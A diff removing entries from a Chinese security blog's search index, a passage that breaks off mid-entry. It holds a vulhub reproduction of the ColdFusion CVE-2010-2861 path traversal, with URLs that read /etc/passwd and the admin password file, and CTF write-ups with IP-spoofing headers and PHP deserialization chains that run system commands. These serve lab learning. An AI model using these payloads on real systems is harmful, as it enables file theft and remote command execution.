@@ -1,593 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</title>
-    <url>/2023/11/11/Adobe-ColdFusion-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2010-2861%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</strong></p>
-<ol>
-<li>复现环境中的任意文件读取漏洞，截图证明</li>
-<li>尝试利用漏洞读取目标系统中的”&#x2F;opt&#x2F;coldfusion8&#x2F;license.txt”文件，提供截图</li>
-</ol>
-<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>执行如下命令启动Adobe CouldFusion 8.0.1版本服务器：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></table></figure>
-
-<p>启动后，访问</p>
-<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm</code></p>
-<p>可以看到初始化页面，输入密码<code>admin</code>，最后点击ok，开始初始化整个环境。</p>
-<img src="https://images.gaifagafin.top/202311112129162.png" style="zoom:67%;" />
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用另外一个浏览器直接访问</p>
-<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</code></p>
-<p>即可读取文件<code>/etc/passwd</code></p>
-<p>我这里在浏览器访问：</p>
-<p><a href="http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en">http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</a></p>
-<img src="https://images.gaifagafin.top/202311112129495.png" style="zoom:67%;" />
-
-<p>读取后台管理员密码</p>
-<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code></p>
-<img src="https://images.gaifagafin.top/202311112129747.png" style="zoom:67%;" />
-
-<h2 id="读取license-txt文件"><a href="#读取license-txt文件" class="headerlink" title="读取license.txt文件"></a>读取license.txt文件</h2><p>根据上面的漏洞复现，构造出payload：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../license.txt%00en<br></code></pre></td></tr></table></figure>
-
-<p>浏览器输入payload得到license.txt</p>
-<img src="https://images.gaifagafin.top/202311112129711.png" style="zoom:67%;" />
-]]></content>
-      <categories>
-        <category>vulhub</category>
-      </categories>
-      <tags>
-        <tag>vulhub</tag>
-        <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUUCTF-NewStar2023-Week1-Begin-of-HTTP</title>
-    <url>/2023/10/26/BUUCTF-NewStar2023-Week1-Begin-of-HTTP/</url>
-    <content><![CDATA[<p>昨天做了一道非常简单的新生赛CTF题目<br>        <img src="https://s2.loli.net/2023/10/29/jAtu2VPR4wWHeCf.png" style="zoom:67%;" />  </p>
-<p>前面的都非常简单，类似这种<br><img src="https://s2.loli.net/2023/10/29/Mo5W4NOSmVtFJRG.png"> 	</p>
-<p>当一步步按照题目的提示来到最后一步时：</p>
-<p><img src="https://s2.loli.net/2023/10/29/VSDjQnTZEqsNey3.png"></p>
-<p>第一时间想到改X-Forwarded-For为127.0.0.1，结果不行</p>
-<p>后来网上一查，发现有很多种方法可以进行请求ip伪造<br>X-Forwarded-For:127.0.0.1</p>
-<p>X-Forwarded:127.0.0.1</p>
-<p>Forwarded-For:127.0.0.1</p>
-<p>Forwarded:127.0.0.1</p>
-<p>X-Forwarded-Host:127.0.0.1</p>
-<p>X-remote-IP:127.0.0.1</p>
-<p>X-remote-addr:127.0.0.1</p>
-<p>True-Client-IP:127.0.0.1</p>
-<p>X-Client-IP:127.0.0.1</p>
-<p>Client-IP:127.0.0.1</p>
-<p>X-Real-IP:127.0.0.1</p>
-<p>Ali-CDN-Real-IP:127.0.0.1</p>
-<p>Cdn-Src-Ip:127.0.0.1</p>
-<p>Cdn-Real-Ip:127.0.0.1</p>
-<p>CF-Connecting-IP:127.0.0.1</p>
-<p>X-Cluster-Client-IP:127.0.0.1</p>
-<p>WL-Proxy-Client-IP:127.0.0.1</p>
-<p>Proxy-Client-IP:127.0.0.1</p>
-<p>Fastly-Client-Ip:127.0.0.1</p>
-<p>True-Client-Ip:127.0.0.1</p>
-<p>Host: 127.0.0.1</p>
-<p>X-Originating-IP: 127.0.0.1</p>
-<p>一个一个试，最后使用的是 X-Real-IP:127.0.0.1</p>
-<p>burpsuite发送</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /?ctf=<span class="hljs-number">111</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: node4.buuoj.cn:<span class="hljs-number">26965</span><br><span class="hljs-attribute">User</span>-Agent:NewStarCTF2023<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Referer</span>: newstarctf.com<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">28</span><br><span class="hljs-attribute">Origin</span>:<span class="hljs-meta"> [http://node4.buuoj.cn:26965](http://node4.buuoj.cn:26965/)</span><br><span class="hljs-meta">Connection: close</span><br><span class="hljs-meta">Cookie: power=ctfer</span><br><span class="hljs-meta">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-meta">X-Client-IP: 127.0.0.1</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">secret=n3wst4rCTF2023g00000d</span><br></code></pre></td></tr></table></figure>
-
-<p>结果：<img src="https://s2.loli.net/2023/10/29/5XF4JSAwHBpNKQg.png"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>CTF_Writeup</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUUCTF-NewStar2023-Week2-ErrorFlask</title>
-    <url>/2023/10/27/BUUCTF-NewStar2023-Week2-ErrorFlask/</url>
-    <content><![CDATA[<p>​    		 <img src="https://images.gaifagafin.top/202311051122456.png" style="zoom:67%;" /></p>
-<p>进入，看到页面</p>
-<p><img src="https://images.gaifagafin.top/202311051120717.png"></p>
-<p>url输入</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://12292bef-a6d9-4fad-9d18-a99ee1cc7a03.node4.buuoj.cn:81/?number1=1&amp;number2=3<br></code></pre></td></tr></table></figure>
-
-<p>回显</p>
-<p><img src="https://images.gaifagafin.top/202311051125913.png"></p>
-<p>url输入</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://fd392ec2-b64c-468a-8242-d1b80e5af4d2.node4.buuoj.cn:81/?number2=a&amp;number1=3<br></code></pre></td></tr></table></figure>
-
-
-
-<p>后会进入报错页面</p>
-<p><img src="https://images.gaifagafin.top/202311051126804.png"></p>
-<p>flag就在报错页面里面，ctrl+f搜flag即可</p>
-<p><img src="https://images.gaifagafin.top/202311051126767.png"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>CTF_Writeup</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUUCTF-NewStar2023-Week3-POP Gadget</title>
-    <url>/2023/11/04/BUUCTF-NewStar2023-Week3-POP_Gadget/</url>
-    <content><![CDATA[<img src="D:/Typora/md_images/image-20231020205454603-1699068024385-1.png" style="zoom:67%;" />
-
-<p>进入题目</p>
-<p><img src="D:/Typora/md_images/image-20231104135906002-1699077564034-1.png"></p>
-<p>代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<br><br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br><br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br><br>    &#125;<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    (<span class="hljs-variable language_">$this</span>-&gt;func)();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br><br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);   <br><br>  &#125;<br><br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]); <br></code></pre></td></tr></table></figure>
-
-<p>下面是POP的一些简介</p>
-<p><img src="D:/Typora/md_images/2293037-20210413224624099-855145573-1699068024385-3.png"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>CTF_Writeup</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>POP链</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BUUCTF-NewStar2023-Week4-More Fast</title>
-    <url>/2023/10/27/BUUCTF-NewStar2023-Week4-More-Fast/</url>
-    <content><![CDATA[<img src="https://s3.bmp.ovh/imgs/2023/10/28/34dbf8d94778b773.png" style="zoom:67%;" />
-
-<p>打开环境</p>
-<p><img src="https://s3.bmp.ovh/imgs/2023/10/28/a48a8a88d726c925.png"></p>
-<p>我们可以看出是POP链构造<span id="more"></span>（不知道什么是POP链的可以自己上网找）</p>
-<p><img src="https://s3.bmp.ovh/imgs/2023/10/28/913636a6247b1fa3.png"></p>
-<p>构造出来是这样的</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;errMsg);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">evil</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>))&#123;<br>            (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not Flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$wel</span> = <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;good;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;NewStar&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good job but nothing&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Crypto</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Reverse</span>();<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Pwn</span>();<br><span class="hljs-variable">$e</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Web</span>();<br><br><span class="hljs-variable">$e</span>-&gt;func= <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$e</span>-&gt;<span class="hljs-keyword">var</span>= <span class="hljs-string">&quot;ls /&quot;</span>;<br><span class="hljs-variable">$d</span>-&gt;obj=<span class="hljs-variable">$e</span>;<br><span class="hljs-variable">$c</span>-&gt;func=<span class="hljs-variable">$d</span>;<br><span class="hljs-variable">$b</span>-&gt;obj=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$a</span>-&gt;errMsg=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$fast</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$fast</span>;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Nope&quot;</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>在本地运行得到序列化字符串</p>
-<p><strong>O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:4:”ls &#x2F;“;}}}}}</strong></p>
-<p>将其用post传参后，回显没有变化。</p>
-<p>提示中提到关键在__destruct()魔术方法</p>
-<hr>
-<p>在php中，当对象被销毁时会自动调用__destruct()方法，<strong>但如果程序报错或者抛出异常，就不会触发该魔术方法。</strong></p>
-<p>当一个类创建之后它会自己消失，而 __destruct() 魔术方法的触发条件就是一个类被销毁时触发，而throw那个函数就是回收了自动销毁的类，导致destruct检测不到有东西销毁，从而也就导致无法触发destruct函数。</p>
-<p>我们可以通过提前触发垃圾回收机制来抛出异常，从而绕过GC回收，唤醒__destruct()魔术方法。</p>
-<p>触发垃圾回收机制的方法有：（本质即使对象引用计数归零）</p>
-<p>（1）对象被unset()处理时，可以触发。</p>
-<p>（2）数组对象为NULL时，可以触发。</p>
-<p>参考链接：<a href="https://blog.csdn.net/Myon5/article/details/134018456">https://blog.csdn.net/Myon5/article/details/134018456</a></p>
-<hr>
-<p>这里采用第二种方法</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;errMsg);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">evil</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>))&#123;<br>            (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not Flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$wel</span> = <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;good;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;NewStar&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good job but nothing&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Crypto</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Reverse</span>();<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Pwn</span>();<br><span class="hljs-variable">$e</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Web</span>();<br><br><span class="hljs-variable">$e</span>-&gt;func= <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$e</span>-&gt;<span class="hljs-keyword">var</span>= <span class="hljs-string">&quot;ls /&quot;</span>;<br><span class="hljs-variable">$d</span>-&gt;obj=<span class="hljs-variable">$e</span>;<br><span class="hljs-variable">$c</span>-&gt;func=<span class="hljs-variable">$d</span>;<br><span class="hljs-variable">$b</span>-&gt;obj=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$a</span>-&gt;errMsg=<span class="hljs-variable">$b</span>;<br><br><span class="hljs-variable">$p</span>=<span class="hljs-keyword">array</span>(<span class="hljs-variable">$a</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$fast</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$p</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$fast</span>;<br><br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Nope&quot;</span>); <br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<p>得到序列化字符串</p>
-<p>a:2:{i:0;O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:4:”ls &#x2F;“;}}}}}i:1;i:0;}</p>
-<p>将末尾的<strong>i:1;i:0</strong>改为<strong>i:0;i:0</strong>即可绕过GC回收，唤醒__destruct()魔术方法。</p>
-<p>成功执行’ls &#x2F;‘，看到flag在根目录</p>
-<p><img src="https://s3.bmp.ovh/imgs/2023/10/28/d2ebdd1475db7d16.png"></p>
-<p>将构造中的’ls &#x2F;‘改为’cat &#x2F;flag’，在进行序列化操作，得到</p>
-<p>fast&#x3D;a:2:{i:0;O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}}i:0;i:0;}</p>
-<p>别忘了将末尾的<strong>i:1;i:0</strong>改为<strong>i:0;i:0</strong></p>
-<p>提交后得到flag</p>
-<p><img src="https://s3.bmp.ovh/imgs/2023/10/28/101171cd3a8346bc.png"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>CTF_Writeup</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Writeup</tag>
-        <tag>POP链</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Http状态码详解</title>
-    <url>/2023/11/04/Http%E7%8A%B6%E6%80%81%E7%A0%81%E8%AF%A6%E8%A7%A3/</url>
-    <content><![CDATA[<h1 id="Http状态码详解"><a href="#Http状态码详解" class="headerlink" title="Http状态码详解"></a>Http状态码详解</h1><p>转载自:<a href="https://config.net.cn/tools/HttpStatusCode.html">https://config.net.cn/tools/HttpStatusCode.html</a></p>
-<ul>
-<li>http状态码的核心作用是Web Server服务器用来告诉客户端，当前的网页请求发生了什么事，或者说当前Web服务器的响应状态</li>
-<li>HTTP 状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型。响应分为五类：信息响应(100–199)，成功响应(200–299)，重定向(300–399)，客户端错误(400–499)和服务器错误 (500–599)</li>
-<li>扩展资料– <a href="https://developer.mozilla.org/zh-CN/docs/web/http/overview">Http概述</a>  | <a href="https://learn.microsoft.com/zh-cn/dotnet/api/system.net.httpstatuscode?view=net-6.0">HttpStatusCode 枚举</a> , <a href="https://developer.mozilla.org/zh-CN/docs/web/http/methods">Http Request Method</a>, <a href="https://config.net.cn/tools/HttpContentType.html">Http Content-Type大全</a>,  <a href="https://config.net.cn/tools/HttpRequestHeader.html">Http Request请求头大全</a>, <a href="https://config.net.cn/tools/HttpResponseHeader.html">Http Response请求头大全</a> , <a href="https://config.net.cn/tools/UserAgent.html">浏览器UserAgent大全</a></li>
-</ul>
-<blockquote>
